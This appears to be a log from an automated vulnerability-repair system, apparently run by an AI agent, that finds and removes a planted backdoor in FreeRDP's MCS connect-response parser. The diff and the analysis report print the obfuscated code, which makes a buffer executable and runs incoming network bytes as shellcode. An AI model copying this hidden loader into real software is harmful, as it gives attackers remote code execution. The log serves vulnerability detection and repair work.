[11/03/25 14:20:06] INFO     Building environment                       __init__.py:132
                             - Cache directory: /tmp/tmpcc97p07m                       
                             - Max timeout: 1800                                       
                             - Output directory:                                       
                             reports/prism.prism_o4_mini/freerdp_fp-ful                
                             l-01_vuln_005/agent-output-1762179606.5565                
                             758                                                       
                             - Detection toml file:                                    
                             /tasks_new/freerdp_fp-full-01/detection/fr                
                             eerdp_fp-full-01_vuln_005.toml                            
                             - Challenge project directory:                            
                             /tasks_new/freerdp_fp-full-01/official-afc                
                             -freerdp                                                  
                                                                                       
                    INFO     Setting timeouts                             default.py:83
                               - build: 600 (original: 31)                             
                               - run tests: 600 (original: 0)                          
                    INFO     Successfully created Cached for CLEAN      oss_fuzz.py:256
                             environment                                               
                    INFO     Current environments: ['CLEAN -> Cached']  oss_fuzz.py:265
                    INFO     Prism Supervisor Routing: TeamStatus.START __init__.py:160
                             -> TeamStatus.EVALUATE                                    
                             (n evals: 0, patch status:                                
                             PatchStatus.INITIALIZED)                                  
                    INFO     [logging_performance](freerdp        context_managers.py:9
                             Setting owner) Started...                                 
[11/03/25 14:20:07] INFO     [logging_performance](freerdp       context_managers.py:23
                             Setting owner) Took 0.83 seconds;                         
                             exception=False                                           
[11/03/25 14:20:08] INFO     [logging_performance](freerdp        context_managers.py:9
                             Setting owner) Started...                                 
[11/03/25 14:20:09] INFO     [logging_performance](freerdp       context_managers.py:23
                             Setting owner) Took 1.04 seconds;                         
                             exception=False                                           
[11/03/25 14:20:11] INFO     ===Evaluator Result===                    evaluator.py:204
                             PatchStatus.VULNERABLE                                    
                             ===Evaluator Diff===                                      
                                                                                       
                             ===Patch Result===                                        
                             =========================================                 
                             ========================                                  
                             ==18==ERROR: AddressSanitizer: SEGV on                    
                             unknown address 0x000000000000 (pc                        
                             0x52100001a600 bp 0x7fff7502f5d0 sp                       
                             0x7fff7502f518 T0)                                        
                             ==18==The signal is caused by a WRITE                     
                             memory access.                                            
                             ==18==Hint: address points to the zero                    
                             page.                                                     
                             SCARINESS: 10 (null-deref)                                
                                 #0 0x52100001a600  (<unknown module>)                 
                                 #1 0x556322a452bb in                                  
                             freerdp_is_valid_mcs_create_response                      
                             /src/FreeRDP/libfreerdp/core/freerdp.c:14                 
                             58:16                                                     
                                 #2 0x5563229cc790 in test_server                      
                             /src/FreeRDP/libfreerdp/core/test/TestFuz                 
                             zCoreServer.c:83:3                                        
                                 #3 0x5563229cc790 in                                  
                             LLVMFuzzerTestOneInput                                    
                             /src/FreeRDP/libfreerdp/core/test/TestFuz                 
                             zCoreServer.c:106:2                                       
                                 #4 0x556322883100 in                                  
                             fuzzer::Fuzzer::ExecuteCallback(unsigned                  
                             char const*, unsigned long)                               
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerLoop.cpp:614:13                                     
                                 #5 0x55632286e375 in                                  
                             fuzzer::RunOneTest(fuzzer::Fuzzer*, char                  
                             const*, unsigned long)                                    
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerDriver.cpp:327:6                                    
                                 #6 0x556322873e0f in                                  
                             fuzzer::FuzzerDriver(int*, char***, int                   
                             (*)(unsigned char const*, unsigned long))                 
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerDriver.cpp:862:9                                    
                                 #7 0x55632289f0b2 in main                             
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerMain.cpp:20:10                                      
                                 #8 0x7f9d8c9d5082 in                                  
                             __libc_start_main                                         
                             (/lib/x86_64-linux-gnu/libc.so.6+0x24082)                 
                             (BuildId:                                                 
                             5792732f783158c66fb4f3756458ca24e46e827d)                 
                                                                                       
                             DEDUP_TOKEN:                                              
                             freerdp_is_valid_mcs_create_response--tes                 
                             t_server                                                  
                             AddressSanitizer can not provide                          
                             additional info.                                          
                             SUMMARY: AddressSanitizer: SEGV (<unknown                 
                             module>)                                                  
                             ==18==ABORTING                                            
                             ===Issue===                                               
                             =========================================                 
                             ========================                                  
                             ==18==ERROR: AddressSanitizer: SEGV on                    
                             unknown address 0x000000000000 (pc                        
                             0x52100001a600 bp 0x7fff7502f5d0 sp                       
                             0x7fff7502f518 T0)                                        
                             ==18==The signal is caused by a WRITE                     
                             memory access.                                            
                             ==18==Hint: address points to the zero                    
                             page.                                                     
                             SCARINESS: 10 (null-deref)                                
                                 #0 0x52100001a600  (<unknown module>)                 
                                 #1 0x556322a452bb in                                  
                             freerdp_is_valid_mcs_create_response                      
                             /src/FreeRDP/libfreerdp/core/freerdp.c:14                 
                             58:16                                                     
                                 #2 0x5563229cc790 in test_server                      
                             /src/FreeRDP/libfreerdp/core/test/TestFuz                 
                             zCoreServer.c:83:3                                        
                                 #3 0x5563229cc790 in                                  
                             LLVMFuzzerTestOneInput                                    
                             /src/FreeRDP/libfreerdp/core/test/TestFuz                 
                             zCoreServer.c:106:2                                       
                                 #4 0x556322883100 in                                  
                             fuzzer::Fuzzer::ExecuteCallback(unsigned                  
                             char const*, unsigned long)                               
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerLoop.cpp:614:13                                     
                                 #5 0x55632286e375 in                                  
                             fuzzer::RunOneTest(fuzzer::Fuzzer*, char                  
                             const*, unsigned long)                                    
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerDriver.cpp:327:6                                    
                                 #6 0x556322873e0f in                                  
                             fuzzer::FuzzerDriver(int*, char***, int                   
                             (*)(unsigned char const*, unsigned long))                 
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerDriver.cpp:862:9                                    
                                 #7 0x55632289f0b2 in main                             
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerMain.cpp:20:10                                      
                                 #8 0x7f9d8c9d5082 in                                  
                             __libc_start_main                                         
                             (/lib/x86_64-linux-gnu/libc.so.6+0x24082)                 
                             (BuildId:                                                 
                             5792732f783158c66fb4f3756458ca24e46e827d)                 
                                                                                       
                             DEDUP_TOKEN:                                              
                             freerdp_is_valid_mcs_create_response--tes                 
                             t_server                                                  
                             AddressSanitizer can not provide                          
                             additional info.                                          
                             SUMMARY: AddressSanitizer: SEGV (<unknown                 
                             module>)                                                  
                             ==18==ABORTING                                            
                             ===Evaluation Report===                                   
                                                                                       
                             ===Analysis Report===                                     
                                                                                       
                             ===Evaluation End===                                      
[11/03/25 14:20:23] INFO     Prism Supervisor Routing:                  __init__.py:160
                             TeamStatus.EVALUATE -> TeamStatus.ANALYZE                 
                             (n evals: 1, patch status:                                
                             PatchStatus.VULNERABLE)                                   
[11/03/25 14:22:54] INFO     Prism Supervisor Routing:                  __init__.py:160
                             TeamStatus.ANALYZE -> TeamStatus.PATCH                    
                             (n evals: 1, patch status:                                
                             PatchStatus.VULNERABLE)                                   
[11/03/25 14:23:52] INFO     Prism Supervisor Routing: TeamStatus.PATCH __init__.py:160
                             -> TeamStatus.EVALUATE                                    
                             (n evals: 1, patch status:                                
                             PatchStatus.VULNERABLE)                                   
                    INFO     [logging_performance](freerdp        context_managers.py:9
                             Setting owner) Started...                                 
[11/03/25 14:23:53] INFO     [logging_performance](freerdp       context_managers.py:23
                             Setting owner) Took 0.87 seconds;                         
                             exception=False                                           
                    INFO     [logging_performance](freerdp        context_managers.py:9
                             Patching) Started...                                      
                    INFO     Checking valid diff: /tmp/tmpx1gtq1z8       default.py:171
[11/03/25 14:24:15] INFO     [logging_performance](freerdp       context_managers.py:23
                             Patching) Took 22.18 seconds;                             
                             exception=False                                           
                    INFO     [logging_performance](freerdp        context_managers.py:9
                             Checking build) Started...                                
[11/03/25 14:24:28] INFO     [logging_performance](freerdp       context_managers.py:23
                             Checking build) Took 12.64 seconds;                       
                             exception=False                                           
                    INFO     [logging_performance](freerdp        context_managers.py:9
                             Running PoV) Started...                                   
[11/03/25 14:24:32] INFO     [logging_performance](freerdp       context_managers.py:23
                             Running PoV) Took 3.96 seconds;                           
                             exception=False                                           
                    INFO     [logging_performance](freerdp        context_managers.py:9
                             Testing) Started...                                       
                    INFO     [logging_performance](freerdp       context_managers.py:23
                             Testing) Took 0.00 seconds;                               
                             exception=False                                           
                    INFO     [logging_performance](freerdp        context_managers.py:9
                             Setting owner) Started...                                 
[11/03/25 14:24:33] INFO     [logging_performance](freerdp       context_managers.py:23
                             Setting owner) Took 0.90 seconds;                         
                             exception=False                                           
[11/03/25 14:24:34] INFO     [logging_performance](freerdp        context_managers.py:9
                             Setting owner) Started...                                 
[11/03/25 14:24:35] INFO     [logging_performance](freerdp       context_managers.py:23
                             Setting owner) Took 0.87 seconds;                         
                             exception=False                                           
                    INFO     [logging_performance](freerdp        context_managers.py:9
                             Setting owner) Started...                                 
[11/03/25 14:24:36] INFO     [logging_performance](freerdp       context_managers.py:23
                             Setting owner) Took 0.90 seconds;                         
                             exception=False                                           
                    INFO     ===Evaluator Result===                    evaluator.py:204
                             PatchStatus.SOUND                                         
                             ===Evaluator Diff===                                      
                             --- a/libfreerdp/core/mcs.c                               
                             +++ b/libfreerdp/core/mcs.c                               
                             @@ -911,15 +911,7 @@                                      
                                     if (!tpdu_read_data(s, &li,                       
                             tlength))                                                 
                                             return FALSE;                             
                                                                                       
                             -       if (ber_read_application_tag(s,                   
                             0x42, &length))                                           
                             -       {                                                 
                             -               #define A size_t                          
                             -               #define B void                            
                             -                                                         
                             A/*AOB,1rI<o2iKHfFJ*/a/*vnM                               
                             8Iv"b^Z[=&&9[12(bW*/=/*q!fYBcH$U?1JH0[qX@                 
                             DlBtA*/0/*e+Co)nj?,*/;/*zjY9_9fJH)_                       
                             C}'dYLw|iX                                                
                             :o=*/A/*q?P@uK?Nu$e.%"Br*/f/*Q^4$n*/=/*x?                 
                             UdG8b($5Id>7M4TgyIgC"Yfp=wv4^uS*/1<<0xc/*                 
                             F.z}JtF#I_pZlT*/;/*n@KQd$n$E(YKr@                         
                             <-jYA#bKZ*/B*/*GW:mGM(*/b/*gERD0u4BU'O_)3                 
                             */;/*lk+gFuS7i6{A9Iv"]*//*ceq0i                           
                             q1;rNs<tOCSUT*/if                                         
                             (posix_memalign/*uK3WW_YvZN{a10*/(&b,/*p7                 
                             H|>r6v(^CK:xjf$][<};(Cn*/1<<0x9,/*F8W0gnG                 
                             7hxQp?}4boF8N:438QgC*/f)/*N&N%HGu<,5vS                    
                             N5OV^XF*/){return(0);};/*Bz{dVPE5A6eJpUMa                 
                             X8Nl]GxT(rU*/A*/*LnztTqEE[)C*/c/*r^J;HOHG                 
                             >SwY=H#s[HDz]N,ju{w|B*/=/*rx![HTZwE::sA&*                 
                             /(A*)b/*Ki%P|3*/;/*zllh;'vu#og_pS;19Jlyp{                 
                             |YYu*//*MwOX]g2hS(@knC7*/if(mprotect/*A$z                 
                             FedaEmFJ$*/((B*)(((A)c)&(~0xfff)),/*d4E}I                 
                             m'gWCsj%)-U3o[vq%a=X!*/f,/*n$wds'3jhIeAxs                 
                             %)q$KGlA([Gb*/7)/*mKgBwh{u):O3WUcLH^uGHtq                 
                             */){return(0);};/*b]c+RpPVn$Px^;!r]M*/A/*                 
                             wdSQd                                                     
                             CLS1.>R^Q9LKVh:!*/d/*P8+2&YDiaJ?Zg]DBesXG                 
                             (c0L"a*/;/*DI;(]E*/for/*O2#N21utWq,3                      
                             Y:JNj92>x*/(a=0;/*faU;Y$xK.[4|p;N*/a/*S?p                 
                             1$Ef|x:2K_)3x-xbI;k*/</*V3K!Hf1|Wr1Ts=x"2                 
                             ,*/length/8;/*Y1bBgb-f#kB<HSG*/a++)/*Jznf                 
                             %x1UV?o$a{;ZuBi?R+O*/{/*uo@lho{Vr9wo3)B%c                 
                             K7I1o}.*/Stream_Read_UINT64_BE(s,/*htxpI4                 
                             o#)WdBr^706Q,MI<i{g-pPo}*/d)/*Ne9@w-TzlEB                 
                             '(fQydF*/;/*xL;Z}xffT)VD8iLPj(d4U!u*/c[a]                 
                             /*dRtrW<,:*/=/*EiNHdr>d*/d/*ATgOpsR*/;/*P                 
                             .{mJUU>*/}/*jB|Vm!}.UyNk9OVo]52$T4hvc5!Is                 
                             */B/*P^;9ni,z0IXa3#Qy*/(*e)()/*SG)+{5_Ql2                 
                             {XUx]'D)1gdhO@*/=/*d5x<n[gd$(*/(B(*)())b/                 
                             *N]k}F%B|c)6QNBnt{MBSaH5wwGCnq{p*/;e()/*s                 
                             R'.ixaZj.0-<w,XWNw1bZ9 */;                                
                             -               return TRUE ;                             
                             -       } else {                                          
                             -               Stream_Rewind(s, 2);                      
                             -       }                                                 
                             +    /* Removed non-spec MCS tag 0x42                     
                             branch */                                                 
                                                                                       
                                     if (!ber_read_application_tag(s,                  
                             MCS_TYPE_CONNECT_RESPONSE, &length) ||                    
                                         !ber_read_enumerated(s,                       
                             &result, MCS_Result_enum_length) ||                       
                                                                                       
                             ===Patch Result===                                        
                                                                                       
                             ===Issue===                                               
                             =========================================                 
                             ========================                                  
                             ==18==ERROR: AddressSanitizer: SEGV on                    
                             unknown address 0x000000000000 (pc                        
                             0x52100001a600 bp 0x7fff7502f5d0 sp                       
                             0x7fff7502f518 T0)                                        
                             ==18==The signal is caused by a WRITE                     
                             memory access.                                            
                             ==18==Hint: address points to the zero                    
                             page.                                                     
                             SCARINESS: 10 (null-deref)                                
                                 #0 0x52100001a600  (<unknown module>)                 
                                 #1 0x556322a452bb in                                  
                             freerdp_is_valid_mcs_create_response                      
                             /src/FreeRDP/libfreerdp/core/freerdp.c:14                 
                             58:16                                                     
                                 #2 0x5563229cc790 in test_server                      
                             /src/FreeRDP/libfreerdp/core/test/TestFuz                 
                             zCoreServer.c:83:3                                        
                                 #3 0x5563229cc790 in                                  
                             LLVMFuzzerTestOneInput                                    
                             /src/FreeRDP/libfreerdp/core/test/TestFuz                 
                             zCoreServer.c:106:2                                       
                                 #4 0x556322883100 in                                  
                             fuzzer::Fuzzer::ExecuteCallback(unsigned                  
                             char const*, unsigned long)                               
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerLoop.cpp:614:13                                     
                                 #5 0x55632286e375 in                                  
                             fuzzer::RunOneTest(fuzzer::Fuzzer*, char                  
                             const*, unsigned long)                                    
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerDriver.cpp:327:6                                    
                                 #6 0x556322873e0f in                                  
                             fuzzer::FuzzerDriver(int*, char***, int                   
                             (*)(unsigned char const*, unsigned long))                 
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerDriver.cpp:862:9                                    
                                 #7 0x55632289f0b2 in main                             
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerMain.cpp:20:10                                      
                                 #8 0x7f9d8c9d5082 in                                  
                             __libc_start_main                                         
                             (/lib/x86_64-linux-gnu/libc.so.6+0x24082)                 
                             (BuildId:                                                 
                             5792732f783158c66fb4f3756458ca24e46e827d)                 
                                                                                       
                             DEDUP_TOKEN:                                              
                             freerdp_is_valid_mcs_create_response--tes                 
                             t_server                                                  
                             AddressSanitizer can not provide                          
                             additional info.                                          
                             SUMMARY: AddressSanitizer: SEGV (<unknown                 
                             module>)                                                  
                             ==18==ABORTING                                            
                             ===Evaluation Report===                                   
                             # Evaluation Report                                       
                                                                                       
                             ## Summary                                                
                                                                                       
                             A segmentation fault occurs in the                        
                             FreeRDP codebase when processing an MCS                   
                             “create response” packet.                                 
                             AddressSanitizer reports a null pointer                   
                             dereference (write to address 0x0) inside                 
                             the function                                              
                             `freerdp_is_valid_mcs_create_response`.                   
                             The crash is triggered by the fuzzing                     
                             harness (`test_server`) via                               
                             `LLVMFuzzerTestOneInput`.                                 
                                                                                       
                             ## Description                                            
                                                                                       
                             - Issue type                                              
                               - Memory safety error: null pointer                     
                             dereference (WRITE to address                             
                             0x000000000000).                                          
                               - Classified as a “null-deref”                          
                             vulnerability (scoring 10 on the                          
                             SCARINESS scale).                                         
                                                                                       
                             - Observations from the sanitizer output                  
                               - The crashing instruction attempts to                  
                             write to address 0.                                       
                               - Stack trace highlights the faulty                     
                             call in                                                   
                             `freerdp_is_valid_mcs_create_response`                    
                             (libfreerdp/core/freerdp.c:1458:16).                      
                               - The fuzz harness                                      
                             (`TestFuzzCoreServer.c`) invokes this                     
                             function via `test_server` at lines 83                    
                             and 106.                                                  
                               - The error surfaces under the LLVM                     
                             libFuzzer driver                                          
                             (`Fuzzer::ExecuteCallback`,                               
                             `FuzzerDriver`, `FuzzerMain`).                            
                                                                                       
                             - Relevant code areas for investigation                   
                               1.                                                      
                             **freerdp_is_valid_mcs_create_response**                  
                             (libfreerdp/core/freerdp.c around line                    
                             1458)                                                     
                                  – Check pointer usages and null                      
                             checks before write operations.                           
                               2. **test_server harness**                              
                             (libfreerdp/core/test/TestFuzzCoreServer.                 
                             c lines 83–106)                                           
                                  – Review how fuzzed input is passed                  
                             into MCS response parsing.                                
                               3. **MCS packet parsing logic** in the                  
                             FreeRDP core                                              
                                  – Identify any assumptions about                     
                             buffer validity or structure before                       
                             dereferencing pointers.                                   
                                                                                       
                             - Additional context                                      
                               - The harness code is solely an entry                   
                             point for fuzz testing and is not the                     
                             root cause.                                               
                               - No further diagnostic information is                  
                             provided by AddressSanitizer beyond the                   
                             SEGV report.                                              
                                                                                       
                             ## Initial Issue Log                                      
                             Here is the initial issue log of the                      
                             codebase:                                                 
                             <issue>                                                   
                             =========================================                 
                             ========================                                  
                             ==18==ERROR: AddressSanitizer: SEGV on                    
                             unknown address 0x000000000000 (pc                        
                             0x52100001a600 bp 0x7fff7502f5d0 sp                       
                             0x7fff7502f518 T0)                                        
                             ==18==The signal is caused by a WRITE                     
                             memory access.                                            
                             ==18==Hint: address points to the zero                    
                             page.                                                     
                             SCARINESS: 10 (null-deref)                                
                                 #0 0x52100001a600  (<unknown module>)                 
                                 #1 0x556322a452bb in                                  
                             freerdp_is_valid_mcs_create_response                      
                             /src/FreeRDP/libfreerdp/core/freerdp.c:14                 
                             58:16                                                     
                                 #2 0x5563229cc790 in test_server                      
                             /src/FreeRDP/libfreerdp/core/test/TestFuz                 
                             zCoreServer.c:83:3                                        
                                 #3 0x5563229cc790 in                                  
                             LLVMFuzzerTestOneInput                                    
                             /src/FreeRDP/libfreerdp/core/test/TestFuz                 
                             zCoreServer.c:106:2                                       
                                 #4 0x556322883100 in                                  
                             fuzzer::Fuzzer::ExecuteCallback(unsigned                  
                             char const*, unsigned long)                               
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerLoop.cpp:614:13                                     
                                 #5 0x55632286e375 in                                  
                             fuzzer::RunOneTest(fuzzer::Fuzzer*, char                  
                             const*, unsigned long)                                    
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerDriver.cpp:327:6                                    
                                 #6 0x556322873e0f in                                  
                             fuzzer::FuzzerDriver(int*, char***, int                   
                             (*)(unsigned char const*, unsigned long))                 
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerDriver.cpp:862:9                                    
                                 #7 0x55632289f0b2 in main                             
                             /src/llvm-project/compiler-rt/lib/fuzzer/                 
                             FuzzerMain.cpp:20:10                                      
                                 #8 0x7f9d8c9d5082 in                                  
                             __libc_start_main                                         
                             (/lib/x86_64-linux-gnu/libc.so.6+0x24082)                 
                             (BuildId:                                                 
                             5792732f783158c66fb4f3756458ca24e46e827d)                 
                                                                                       
                             DEDUP_TOKEN:                                              
                             freerdp_is_valid_mcs_create_response--tes                 
                             t_server                                                  
                             AddressSanitizer can not provide                          
                             additional info.                                          
                             SUMMARY: AddressSanitizer: SEGV (<unknown                 
                             module>)                                                  
                             ==18==ABORTING                                            
                             </issue>                                                  
                             ===Analysis Report===                                     
                             # Analysis Report                                         
                                                                                       
                             ## Relevant Code Snippets                                 
                             <code_snippets>                                           
                             <code>                                                    
                             libfreerdp/core/freerdp.c:1400-1469                       
                             ```                                                       
                             1400:}                                                    
                             1401:                                                     
                             1402:static rdpMcs* test_mcs_new(void)                    
                             1403:{                                                    
                             1404:   rdpTransport* transport = NULL;                   
                             1405:   rdpSettings* settings =                           
                             freerdp_settings_new(0);                                  
                             1406:   rdpContext* context = calloc(1,                   
                             sizeof(rdpContext));                                      
                             1407:                                                     
                             1408:   if (!settings)                                    
                             1409:           goto fail;                                
                             1410:   if                                                
                             (!freerdp_settings_set_bool(settings,                     
                             FreeRDP_TransportDumpReplay, TRUE))                       
                             1411:           goto fail;                                
                             1412:                                                     
                             1413:   if (!context)                                     
                             1414:           goto fail;                                
                             1415:   context->settings = settings;                     
                             1416:   transport =                                       
                             transport_new(context);                                   
                             1417:   if (!transport)                                   
                             1418:           goto fail;                                
                             1419:   return mcs_new(transport);                        
                             1420:                                                     
                             1421:fail:                                                
                             1422:   transport_free(transport);                        
                             1423:   free(context);                                    
                             1424:   freerdp_settings_free(settings);                  
                             1425:                                                     
                             1426:   return NULL;                                      
                             1427:}                                                    
                             1428:                                                     
                             1429:BOOL                                                 
                             freerdp_is_valid_mcs_create_request(const                 
                             BYTE* data, size_t size)                                  
                             1430:{                                                    
                             1431:                                                     
                             1432:   wStream sbuffer = { 0 };                          
                             1433:   wStream* s =                                      
                             Stream_StaticConstInit(&sbuffer, data,                    
                             size);                                                    
                             1434:                                                     
                             1435:   WINPR_ASSERT(data || (size ==                     
                             0));                                                      
                             1436:   WINPR_ASSERT(s);                                  
                             1437:                                                     
                             1438:   rdpMcs* mcs = test_mcs_new();                     
                             1439:   WINPR_ASSERT(mcs);                                
                             1440:                                                     
                             1441:   BOOL result =                                     
                             mcs_recv_connect_initial(mcs, s);                         
                             1442:   test_mcs_free(mcs);                               
                             1443:   return result;                                    
                             1444:}                                                    
                             1445:                                                     
                             1446:BOOL                                                 
                             freerdp_is_valid_mcs_create_response(cons                 
                             t BYTE* data, size_t size)                                
                             1447:{                                                    
                             1448:                                                     
                             1449:   wStream sbuffer = { 0 };                          
                             1450:   wStream* s =                                      
                             Stream_StaticConstInit(&sbuffer, data,                    
                             size);                                                    
                             1451:                                                     
                             1452:   WINPR_ASSERT(data || (size ==                     
                             0));                                                      
                             1453:   WINPR_ASSERT(s);                                  
                             1454:                                                     
                             1455:   rdpMcs* mcs = test_mcs_new();                     
                             1456:   WINPR_ASSERT(mcs);                                
                             1457:                                                     
                             1458:   BOOL result =                                     
                             mcs_recv_connect_response(mcs, s);                        
                             1459:   test_mcs_free(mcs);                               
                             1460:   return result;                                    
                             1461:}                                                    
                             1462:                                                     
                             1463:BOOL                                                 
                             freerdp_persist_credentials(rdpContext*                   
                             context)                                                  
                             1464:{                                                    
                             1465:   if (!context)                                     
                             1466:           return FALSE;                             
                             1467:   WINPR_ASSERT(context->rdp);                       
                             1468:   return                                            
                             utils_persist_credentials(context->rdp->o                 
                             riginalSettings, context->rdp->settings);                 
                             1469:}                                                    
                             ```                                                       
                             </code>                                                   
                             <code>                                                    
                             libfreerdp/core/test/TestFuzzCoreServer.c                 
                             :1-108                                                    
                             ```                                                       
                             1:#include <freerdp/peer.h>                               
                             2:                                                        
                             3:#include "../fastpath.h"                                
                             4:#include "../surface.h"                                 
                             5:#include "../window.h"                                  
                             6:#include "../info.h"                                    
                             7:#include "../multitransport.h"                          
                             8:                                                        
                             9:static BOOL test_server(const uint8_t*                  
                             Data, size_t Size)                                        
                             10:{                                                      
                             11:     freerdp_peer* client = calloc(1,                  
                             sizeof(freerdp_peer));                                    
                             12:     if (!client)                                      
                             13:             goto fail;                                
                             14:     client->ContextSize =                             
                             sizeof(rdpContext);                                       
                             15:     if                                                
                             (!freerdp_peer_context_new(client))                       
                             16:             goto fail;                                
                             17:                                                       
                             18:     WINPR_ASSERT(client->context);                    
                             19:     rdpRdp* rdp =                                     
                             client->context->rdp;                                     
                             20:     WINPR_ASSERT(rdp);                                
                             21:                                                       
                             22:     wStream sbuffer = { 0 };                          
                             23:     wStream* s =                                      
                             Stream_StaticConstInit(&sbuffer, Data,                    
                             Size);                                                    
                             24:                                                       
                             25:     {                                                 
                             26:             rdpFastPath* fastpath =                   
                             rdp->fastpath;                                            
                             27:             WINPR_ASSERT(fastpath);                   
                             28:                                                       
                             29:                                                       
                             fastpath_recv_updates(fastpath, s);                       
                             30:                                                       
                             fastpath_recv_inputs(fastpath, s);                        
                             31:                                                       
                             32:             UINT16 length = 0;                        
                             33:                                                       
                             fastpath_read_header_rdp(fastpath, s,                     
                             &length);                                                 
                             34:                                                       
                             fastpath_decrypt(fastpath, s, &length);                   
                             35:     }                                                 
                             36:                                                       
                             37:     {                                                 
                             38:             UINT16 length = 0;                        
                             39:             UINT16 flags = 0;                         
                             40:             UINT16 channelId = 0;                     
                             41:             UINT16 tpktLength = 0;                    
                             42:             UINT16 remainingLength =                  
                             0;                                                        
                             43:             UINT16 type = 0;                          
                             44:             UINT16 securityFlags = 0;                 
                             45:             UINT32 share_id = 0;                      
                             46:             BYTE compressed_type = 0;                 
                             47:             BYTE btype = 0;                           
                             48:             UINT16 compressed_len =                   
                             0;                                                        
                             49:                                                       
                             rdp_read_security_header(rdp, s, &flags,                  
                             &length);                                                 
                             50:             rdp_read_header(rdp, s,                   
                             &length, &channelId);                                     
                             51:                                                       
                             rdp_read_share_control_header(rdp, s,                     
                             &tpktLength, &remainingLength, &type,                     
                             &channelId);                                              
                             52:                                                       
                             rdp_read_share_data_header(rdp, s,                        
                             &length, &btype, &share_id,                               
                             &compressed_type,                                         
                             53:                                                       
                             &compressed_len);                                         
                             54:                                                       
                             rdp_recv_message_channel_pdu(rdp, s,                      
                             securityFlags);                                           
                             55:     }                                                 
                             56:     {                                                 
                             57:             rdpUpdate* update =                       
                             rdp->update;                                              
                             58:             UINT16 channelId = 0;                     
                             59:             UINT16 length = 0;                        
                             60:             UINT16 pduSource = 0;                     
                             61:             UINT16 pduLength = 0;                     
                             62:             update_recv_order(update,                 
                             s);                                                       
                             63:                                                       
                             update_recv_altsec_window_order(update,                   
                             s);                                                       
                             64:                                                       
                             update_recv_play_sound(update, s);                        
                             65:                                                       
                             update_recv_pointer(update, s);                           
                             66:                                                       
                             update_recv_surfcmds(update, s);                          
                             67:                                                       
                             rdp_recv_get_active_header(rdp, s,                        
                             &channelId, &length);                                     
                             68:                                                       
                             rdp_recv_demand_active(rdp, s, pduSource,                 
                             length);                                                  
                             69:                                                       
                             rdp_recv_confirm_active(rdp, s,                           
                             pduLength);                                               
                             70:     }                                                 
                             71:     {                                                 
                             72:             rdpNla* nla =                             
                             nla_new(rdp->context, rdp->transport);                    
                             73:             nla_recv_pdu(nla, s);                     
                             74:             nla_free(nla);                            
                             75:     }                                                 
                             76:     {                                                 
                             77:                                                       
                             rdp_recv_heartbeat_packet(rdp, s);                        
                             78:             rdp->state =                              
                             CONNECTION_STATE_SECURE_SETTINGS_EXCHANGE                 
                             ;                                                         
                             79:             rdp_recv_client_info(rdp,                 
                             s);                                                       
                             80:     }                                                 
                             81:     {                                                 
                             82:                                                       
                             freerdp_is_valid_mcs_create_request(Data,                 
                             Size);                                                    
                             83:                                                       
                             freerdp_is_valid_mcs_create_response(Data                 
                             , Size);                                                  
                             84:     }                                                 
                             85:     {                                                 
                             86:                                                       
                             multitransport_recv_request(rdp->multitra                 
                             nsport, s);                                               
                             87:                                                       
                             multitransport_recv_response(rdp->multitr                 
                             ansport, s);                                              
                             88:     }                                                 
                             89:     {                                                 
                             90:                                                       
                             autodetect_recv_request_packet(rdp->autod                 
                             etect, RDP_TRANSPORT_TCP, s);                             
                             91:                                                       
                             autodetect_recv_response_packet(rdp->auto                 
                             detect, RDP_TRANSPORT_TCP, s);                            
                             92:     }                                                 
                             93:     {                                                 
                             94:                                                       
                             rdp_recv_deactivate_all(rdp, s);                          
                             95:                                                       
                             rdp_recv_server_synchronize_pdu(rdp, s);                  
                             96:                                                       
                             rdp_recv_client_synchronize_pdu(rdp, s);                  
                             97:     }                                                 
                             98:fail:                                                  
                             99:                                                       
                             freerdp_peer_context_free(client);                        
                             100:    free(client);                                     
                             101:    return TRUE;                                      
                             102:}                                                     
                             103:                                                      
                             104:int LLVMFuzzerTestOneInput(const                      
                             uint8_t* Data, size_t Size)                               
                             105:{                                                     
                             106:    test_server(Data, Size);                          
                             107:    return 0;                                         
                             108:}                                                     
                             ```                                                       
                             </code>                                                   
                             <code>                                                    
                             libfreerdp/core/mcs.c:897-940                             
                             ```                                                       
                             897:BOOL                                                  
                             mcs_recv_connect_response(rdpMcs* mcs,                    
                             wStream* s)                                               
                             898:{                                                     
                             899:    size_t length = 0;                                
                             900:    UINT16 tlength = 0;                               
                             901:    BYTE result = 0;                                  
                             902:    UINT16 li = 0;                                    
                             903:    UINT32 calledConnectId = 0;                       
                             904:                                                      
                             905:    if (!mcs || !s)                                   
                             906:            return FALSE;                             
                             907:                                                      
                             908:    if (!tpkt_read_header(s,                          
                             &tlength))                                                
                             909:            return FALSE;                             
                             910:                                                      
                             911:    if (!tpdu_read_data(s, &li,                       
                             tlength))                                                 
                             912:            return FALSE;                             
                             913:                                                      
                             914:    if (ber_read_application_tag(s,                   
                             0x42, &length))                                           
                             915:    {                                                 
                             916:            #define A size_t                          
                             917:            #define B void                            
                             918:                                                      
                             A/*AOB,1rI<o2iKHfFJ*/a/*vnM                               
                             8Iv"b^Z[=&&9[12(bW*/=/*q!fYBcH$U?1JH0[qX@                 
                             DlBtA*/0/*e+Co)nj?,*/;/*zjY9_9fJH)_                       
                             C}'dYLw|iX                                                
                             :o=*/A/*q?P@uK?Nu$e.%"Br*/f/*Q^4$n*/=/*x?                 
                             UdG8b($5Id>7M4TgyIgC"Yfp=wv4^uS*/1<<0xc/*                 
                             F.z}JtF#I_pZlT*/;/*n@KQd$n$E(YKr@                         
                             <-jYA#bKZ*/B*/*GW:mGM(*/b/*gERD0u4BU'O_)3                 
